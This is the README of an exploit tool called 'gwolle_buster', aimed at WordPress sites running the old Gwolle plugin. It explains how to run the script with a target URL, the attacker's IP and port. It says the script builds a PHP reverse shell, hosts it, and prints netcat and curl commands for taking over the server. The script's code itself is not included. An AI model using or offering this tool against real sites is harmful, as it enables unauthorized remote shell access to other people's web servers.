# gwolle_buster
this script is exploit for wordpress old plugin gwolle

usage:

./gwolle_buster.py <target_url> <Lhost> <Lport>

first arguments <target_url> => your target url of wordpress that installed gwolle
second arguments <Lhost> => your ip
third arguments <Lport> => listening port for reverse shell 

example: ./gwolle_buster.py http://vulnpress.com/ 192.168.1.5 1234

This Script will generate the php reverse shell script and bind the simple server,
so you need open the 2 new terminal and listen the netcat at first terminal, and request with curl commands,
however, commands are auto generate and appear at console,
therefore you can copy and paste easily 
